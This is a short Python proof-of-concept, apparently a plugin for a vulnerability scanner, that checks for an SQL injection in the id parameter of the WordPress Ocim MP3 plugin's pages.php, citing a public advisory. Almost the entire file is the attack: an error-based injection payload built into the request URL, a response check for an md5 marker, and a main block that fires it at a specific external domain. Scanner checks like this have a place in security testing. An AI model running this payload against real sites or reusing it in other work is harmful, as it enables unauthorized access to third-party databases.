#__author__ = 'ning-pc'
# -*- coding: utf-8 -*-
#referer:https://cxsecurity.com/issue/WLB-2016020220
#title:	Wordpress Ocim MP3 Plugin ocim-mp3/source/pages.php id参数SQL注入漏洞
import re
import urllib

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    verify_url =arg + "wp-content/plugins/ocim-mp3/source/pages.php?id=1' AND (SELECT 1  FROM(SELECT COUNT(*),CONCAT(md5(1),(SELECT (ELT(5674=5674,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'zSwk'='zSwk"
    code, head, res, errcode, _ = curl.curl2(verify_url)
    #print res
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res :
        security_info(verify_url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://mp3onjuice.xyz/')[1])